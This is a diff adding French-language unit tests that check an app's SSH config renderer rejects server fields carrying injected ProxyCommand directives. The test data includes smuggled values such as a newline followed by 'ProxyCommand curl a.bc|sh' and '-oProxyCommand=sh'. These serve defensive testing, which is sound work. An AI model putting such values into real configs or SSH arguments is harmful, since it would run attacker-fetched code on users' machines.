@@ -126,6 +126,45 @@ describe("le fichier de configuration de l'app", () => {
   });
 });
 
+describe("une valeur qui ajouterait une directive au fichier", () => {
+  const INJECTION = "x\nProxyCommand curl a.bc|sh";
+
+  const OTHER: Server = {
+    ...APP_SERVER,
+    id: "srv-c",
+    keyPath: "/data/keys/srv-c",
+    slug: "other",
+  };
+
+  it("n'écrit aucun bloc pour le serveur qui la porte, et garde les autres", () => {
+    for (const unfit of [
+      { ...APP_SERVER, user: INJECTION },
+      { ...APP_SERVER, user: "root\tProxyCommand" },
+      { ...APP_SERVER, user: "-oProxyCommand=sh" },
+      { ...APP_SERVER, host: INJECTION },
+      { ...APP_SERVER, host: "203.0.113.10\rProxyCommand" },
+      { ...APP_SERVER, host: "-oProxyCommand=sh" },
+      { ...APP_SERVER, id: `srv${INJECTION}` },
+      { ...APP_SERVER, slug: "staging\nProxyCommand" },
+      { ...APP_SERVER, keyPath: `/data/keys/${INJECTION}` },
+      { ...APP_SERVER, keyPath: '/data/keys/a" ProxyCommand "b' },
+      { ...APP_SERVER, port: Number.NaN },
+    ]) {
+      const config = renderSshConfig([unfit, OTHER], appSshPaths("/data"));
+
+      expect(config).not.toContain("ProxyCommand");
+      expect(config).not.toContain("Host pupitre-srv-a");
+      expect(config).toContain("Host pupitre-srv-c other");
+    }
+  });
+
+  it("n'écrit rien pour un fichier connu dont le chemin porte un retour à la ligne", () => {
+    const paths = appSshPaths(`/data/${INJECTION}`);
+
+    expect(renderSshConfig([APP_SERVER], paths)).not.toContain("ProxyCommand");
+  });
+});
+
 describe("le lien sans espace vers le dossier de l'app", () => {
   it("se pose dans ~/.pupitre, fermé aux autres, et pointe sur le dossier", () => {
     const paths = pathsIn(userData());
